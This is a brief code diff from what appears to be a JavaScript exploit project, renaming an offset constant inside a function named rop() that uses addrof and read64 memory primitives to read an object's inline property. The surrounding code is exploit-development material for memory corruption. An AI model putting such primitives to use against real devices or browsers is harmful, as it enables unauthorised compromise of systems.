@@ -555,7 +555,7 @@ function rop() {
     alert('success');
     obj.a = res;
     // read inline property
-    const res2 = mem.addrof(obj).read64(offset_js_inline_property);
+    const res2 = mem.addrof(obj).read64(offset_js_inline_prop);
     debug_log(`res2: ${res2}`);
     debug_log(`vector: ${vector}`);
 
